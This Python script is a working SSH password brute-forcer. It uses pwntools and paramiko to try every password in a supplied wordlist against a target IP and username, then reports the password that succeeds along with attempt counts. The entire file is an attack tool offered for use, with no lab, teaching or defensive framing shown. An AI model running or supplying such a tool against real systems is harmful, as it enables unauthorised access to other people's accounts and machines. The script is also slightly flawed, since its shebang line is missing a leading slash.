#!usr/bin/env python

from pwn import *
import paramiko
import optparse

def help_menu():
    arg=optparse.OptionParser()
    arg.add_option("-u", "--usname", dest= "username", help= "enter username of target ip e.g. <root>@192.168.1.1")
    arg.add_option("-i", "--ipaddr", dest= "target_ip", help= "enter target ip e.g. root@<192.168.1.1>")
    arg.add_option("-w", "--wordlist", dest= "wordlist", help= "enter your wordlist")
    (options, arguments) = arg.parse_args()
    if not options.username:
       arg.error("\033[1;31msee help page by using -h, --help\033[0m")
    elif not options.target_ip:
       arg.error("\033[1;31msee help page by using -h, --help\033[0m") 
    elif not options.wordlist:
       arg.error("\033[1;31msee help page by using -h, --help\033[0m") 
    return options   

def count(wordlist):
    with open(wordlist, 'r') as f:
        lines = f.readlines()
        return len(lines)

def ssh_bruteforce(username, target_ip, wordlist):
    attempts = 1 
    failed = 0
    countt = count(wordlist)
    with open(wordlist,"r") as passwords_list:
        for password in passwords_list:
            password=password.strip("\n")
            try:
               connection = ssh(host= target_ip, user= username, password= password, timeout= 2)
               if connection.connected():
                  connection.close()
                  print("\033[1;35mPassword found: '{}'\033[0m".format(password))
                  print("\033[1;31mLogin Attempts: {}\033[0m".format(attempts))
                  print("\033[1;31mLogin failed: {}\033[0m".format(failed))
                  break
               connection.close()
            except paramiko.ssh_exception.AuthenticationException:
               failed += 1
            attempts += 1
        if countt == failed:
            print("\033[1;31mGiven wordlist:'{}' does not contain correct password\033[0m".format(wordlist))

if __name__ == "__main__":
   options = help_menu()
   ssh_bruteforce(options.username, options.target_ip, options.wordlist)
